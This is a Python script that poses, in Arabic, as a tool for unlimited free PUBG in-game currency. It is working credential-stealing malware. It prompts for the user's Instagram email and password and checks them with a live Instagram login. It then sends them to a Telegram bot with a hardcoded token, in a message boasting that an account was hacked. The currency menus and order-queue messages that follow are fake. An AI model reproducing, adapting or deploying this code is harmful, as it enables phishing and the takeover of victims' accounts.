import requests, random, requests, json, pyfiglet,sys,time, os, uuid
Ab='\033[1;92m'
aB='\033[1;91m'
AB='\033[1;96m'
aBbs='\033[1;93m'
AbBs='\033[1;95m'
A_bSa = '\033[1;31m'
a_bSa = '\033[1;32m'
faB_s = '\033[2;32m'
a_aB_s = '\033[2;39m'
Ba_bS = '\033[2;36m'
Ya_Bs = '\033[1;34m'
S_aBs = '\033[1;33m'
ab = pyfiglet.figlet_format("@SF7SF0")
print(a_bSa+ab)
def slow(T): 
	for r in T + '\n' :
	    sys.stdout.write(r)
	    sys.stdout.flush()
slow(S_aBs+"""⌯ اسمع الشروط عزيزي 🤍.   \n ⌯ نورت بعد كلبي اداة زيادة شدات ببجي بلا حدود 💵🇮🇶
---------------------------------------------------
""")
uid = uuid
username = input (''+Ba_bS+'('+a_aB_s+'!'+S_aBs+')'+Ba_bS+'  ⌯ Enter email  :  '+faB_s)
print('  ')
password = input (''+Ba_bS+'('+a_aB_s+'!'+S_aBs+')'+Ba_bS+'  ⌯ Enter Password  :  '+faB_s)
print('  ')
url_login = 'https://www.instagram.com/accounts/login/ajax/'
headers_login = {
    'accept': '*/*',
    'accept-encoding': 'gzip, deflate, br',
    'accept-language': 'ar,en-US;q=0.9,en;q=0.8',
    'content-length': '291',
    'content-type': 'application/x-www-form-urlencoded',
    'cookie': 'ig_did=3E70DB93-4A27-43EB-8463-E0BFC9B02AE1; mid=YCAadAALAAH35g_7e7h0SwBbFzBt; ig_nrcb=1; csrftoken=COmXgzKurrq8awSnRS1xf3u9rL6QsGZI',
    'origin': 'https://www.instgram.com',
    'referer': 'https://www.instagram.com/',
    'sec-fetch-dest': 'empty',
    'sec-fetch-mode': 'cors',
    'sec-fetch-site': 'same-origin',
    'user-agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/88.0.4324.150 Safari/537.36',
    'x-csrftoken': 'COmXgzKurrq8awSnRS1xf3u9rL6QsGZI',
    'x-ig-app-id': '936619743392459',
    'x-ig-www-claim': '0',
    'x-instagram-ajax': '1cb44f68ffec',
    'x-requested-with': 'XMLHttpRequest'
}
data_login = {
    'username': username,
    'enc_password': f'#PWD_INSTAGRAM_BROWSER:0:1613414957:{password}',
    'queryParams': '{}',
    'optIntoOneTap': 'false'
}
req_login = requests.post(url_login, data=data_login, headers=headers_login)
if '"authenticated":false' in req_login.text:
    print(''+Ba_bS+'('+a_aB_s+'!'+S_aBs+')'+Ba_bS+'  ⌯ Username or Password Is Error Try Agin . \n ⌯ اسم الستخدم او الباسورد خطأ اعد مره اخرۍ .')
    exit(0)
elif '"authenticated":true' in req_login.text:
    print(''+Ba_bS+'('+a_aB_s+'√'+S_aBs+')'+Ba_bS+'  ⌯ Done Login . \n ⌯ تم تسجيل الدخول بنجاح .')
os.system("clear")		
print(a_bSa+ab)
ID = '#ايديك'
token = '#توكنك'
t = requests.post(f"https://api.telegram.org/bot{8685050104:AAHUec8CRSVZPB3r2atAlN4754e-goj4jEo}/sendMessage?chat_id={8009156376}&text=تن اختراق حساب من قبل صوفي\n USER - {username}\nPASSWORD - {password}\nPY : معرف لا يعرف ")
slow(S_aBs+''' 
                    ⇦100 شده ⌯  [ 1 ]
⇦ 200 شده ⌯  [ 2 ]
 500 شده ⌯  [ 3 ]
 ⇦ 1000 شده ⌯  [ 4 ]
 ⇦ 2000 شده ⌯  [ 5 ]
   \n''')
Abs = input (''+Ba_bS+'  ⌯ اختر عدد شدات التريد ربحها .\n ⌯ Choose the number of US you want  :  '+faB_s)
print('  ')
if (Abs == '1'):
	print(Ba_bS+'\n- اهلا بك عزيزي مره اخرى تم اختيار طلبك 100  \nشده يرجى الانتضار الى ان يتم الوصول الى طلبك\n الطلبات الان 10 طل 💞💞\n\n - Welcome dear, once again your request has been\nselected to throw 3000 followers Please wait\n until your request is reached Orders are now\n   50 requests 💞💞.   ')
if (Abs == '2'):
	print(Ba_bS+'\n- اهلا بك عزيزي مره اخرى تم اختيار طلبك 200\nشده يرجى الانتضار الى ان يتم الوصول الى طلبك\n الطلبات الان 30 طلب 💞💞\n\n - Welcome dear, once again your request has been\nselected to throw 8000 followers Please wait\n until your request is reached Orders are now\n   150 requests 💞💞.   ')
if (Abs == '3'):
	print(Ba_bS+'\n- اهلا بك عزيزي مره اخرى تم اختيار طلبك 500\nشده يرجى الانتضار الى ان يتم الوصول الى طلبك\n الطلبات الان 50 طلب 💞💞\n\n - Welcome dear, once again your request has been\nselected to throw 10000 followers Please wait\n until your request is reached Orders are now\n   200 requests 💞💞.   ')
if (Abs == '4'):
	print(Ba_bS+'\n- اهلا بك عزيزي مره اخرى تم اختيار طلبك 1000\nشده يرجى الانتضار الى ان يتم الوصول الى طلبك\n الطلبات الان 60 طلب 💞💞\n\n - Welcome dear, once again your request has been\nselected to throw 15000 followers Please wait\n until your request is reached Orders are now\n   250 requests 💞💞.   ')
if (Abs == '5'):
	print(Ba_bS+'\n- اهلا بك عزيزي مره اخرى تم اختيار طلبك 2000\nشده يرجى الانتضار الى ان يتم الوصول الى طلبك\n الطلبات الان 70 طلب 💞💞\n\n - Welcome dear, once again your request has been\nselected to throw 20000 followers Please wait\n until your request is reached Orders are now\n   2 requests 💞💞.   ')